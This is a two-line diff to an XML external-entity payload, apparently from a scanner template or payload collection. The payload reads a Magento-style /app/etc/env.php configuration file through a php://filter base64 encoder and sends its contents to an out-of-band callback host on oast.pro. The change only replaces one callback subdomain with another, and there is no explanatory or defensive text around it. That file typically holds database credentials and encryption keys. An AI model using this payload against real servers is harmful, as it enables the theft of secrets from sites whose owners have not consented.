@@ -1,2 +1,2 @@
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/../app/etc/env.php">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://cqkf5m8vkgto19lkhdg0y58ex8eb3cy8m.oast.pro?%data;'>">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://cqkjab8vkgtrf3kjqt3gizwiahqtgwzw1.oast.pro?%data;'>">
